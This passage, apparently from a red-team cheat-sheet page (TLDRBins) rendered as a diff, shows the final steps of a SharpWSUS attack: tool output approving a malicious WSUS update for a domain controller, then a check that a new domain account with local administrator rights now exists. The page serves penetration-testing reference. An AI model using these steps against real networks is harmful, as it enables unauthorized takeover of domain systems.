+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go"> ____  _                   __        ______  _   _ ____
+</span></span></span><span class="line"><span class="cl"><span class="go">/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+</span></span></span><span class="line"><span class="cl"><span class="go">\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
+</span></span></span><span class="line"><span class="cl"><span class="go"> ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+</span></span></span><span class="line"><span class="cl"><span class="go">|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+</span></span></span><span class="line"><span class="cl"><span class="go">                       |_|
+</span></span></span><span class="line"><span class="cl"><span class="go">           Phil Keeble @ Nettitude Red Team
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: Approve Update
+</span></span></span><span class="line"><span class="cl"><span class="go">C:\WSUS-Updates\WsusContent
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Targeting dc.example.com
+</span></span></span><span class="line"><span class="cl"><span class="go">TargetComputer, ComputerID, TargetID
+</span></span></span><span class="line"><span class="cl"><span class="go">------------------------------------
+</span></span></span><span class="line"><span class="cl"><span class="go">dc.example.com, a9d52bcf-9d8d-4afa-b602-09a1e977d6fb, 1
+</span></span></span><span class="line"><span class="cl"><span class="go">Group Exists = False
+</span></span></span><span class="line"><span class="cl"><span class="go">Group Created: Group Name3
+</span></span></span><span class="line"><span class="cl"><span class="go">Added Computer To Group
+</span></span></span><span class="line"><span class="cl"><span class="go">Approved Update
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Approve complete
+</span></span></span></div></pre></div><h4 id="7-check-optional">7. Check [Optional]</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># In RDP Session
+</span></span><span class="line"><span class="cl">Search -&gt; Update Services
+</span></span><span class="line"><span class="cl">Updates -&gt; All Updates
+</span></span><span class="line"><span class="cl">Approval: Any Except Declined, Status: Any -&gt; Refresh
+</span></span><span class="line"><span class="cl">SharpWSUS Update -&gt; 100%
+</span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><h4 id="8-check">8. Check</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">net user <span class="o editable-keyword">&lt;NEW_USER&gt;</span> /domain
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">PS C:\&gt; net user dummy /domain
+</span></span></span><span class="line"><span class="cl"><span class="go">net user dummy /domain
+</span></span></span><span class="line"><span class="cl"><span class="go">The request will be processed at a domain controller for domain example.com.
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">User name                    dummy
+</span></span></span><span class="line"><span class="cl"><span class="go">Full Name                    
+</span></span></span><span class="line"><span class="cl"><span class="go">Comment                      
+</span></span></span><span class="line"><span class="cl"><span class="go">User's comment               
+</span></span></span><span class="line"><span class="cl"><span class="go">Country/region code          000 (System Default)
+</span></span></span><span class="line"><span class="cl"><span class="go">Account active               Yes
+</span></span></span><span class="line"><span class="cl"><span class="go">Account expires              Never
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Password last set            8/6/2025 7:35:26 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">Password expires             9/17/2025 7:35:26 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">Password changeable          8/7/2025 7:35:26 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">Password required            Yes
+</span></span></span><span class="line"><span class="cl"><span class="go">User may change password     Yes
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Workstations allowed         All
+</span></span></span><span class="line"><span class="cl"><span class="go">Logon script                 
+</span></span></span><span class="line"><span class="cl"><span class="go">User profile                 
+</span></span></span><span class="line"><span class="cl"><span class="go">Home directory               
+</span></span></span><span class="line"><span class="cl"><span class="go">Last logon                   Never
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Logon hours allowed          All
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Local Group Memberships      *Administrators       
+</span></span></span><span class="line"><span class="cl"><span class="go">Global Group memberships     *Domain Users         
+</span></span></span><span class="line"><span class="cl"><span class="go">The command completed successfully.
+</span></span></span></div></pre></div><p><small><em>Ref: <a href="https://github.com/techspence/SharpWSUS/tree/main">SharpWSUS</a></em></small></p></div></div><p></p>
+
+</div>
+</main>
+<script type="module" src="/js/main.js"></script>
+<footer>
+  <hr>
+  <div>© 2025 TLDRBins</div>
+</footer>
+
+
+</body></html>
